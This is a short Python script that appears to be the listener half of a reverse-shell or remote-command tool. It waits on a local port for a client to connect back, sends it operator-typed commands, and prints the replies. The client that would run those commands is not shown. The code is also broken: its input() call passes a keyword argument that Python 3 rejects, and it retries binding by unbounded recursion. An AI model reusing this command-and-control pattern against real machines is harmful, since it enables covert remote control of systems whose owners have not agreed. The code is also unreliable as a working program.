import socket
import sys
def createSocket():
    try:
        global host
        global port
        global s
        host = "127.0.0.1"
        port = 5000
        s = socket.socket()

    except socket.error as err:
        print(err)

def bindSocket():
    try:
        global host
        global port
        global s
        print(port)
        print(str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as err:
        print(err)
        print('Trying Again')
        bindSocket()

def socketAccept():
    connection, address = s.accept()
    print('Socket Accepted')
    print("IP"+address[0]+"/"+"PORT"+str(address[1]))
    sendData(connection)
    connection.close()
#Sends Commands to Client
def sendData(connection):
    while True:
        cmd = input(prompt="Enter a command")
        if cmd == 'quit':
            s.close()
            connection.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            connection.send(str.encode(cmd))
            print('CMD sent')
            response = str(connection.recv(1024),'utf-8')
            print('Response:'+response,end='')

def main():
    createSocket()
    bindSocket()
    socketAccept()

main()
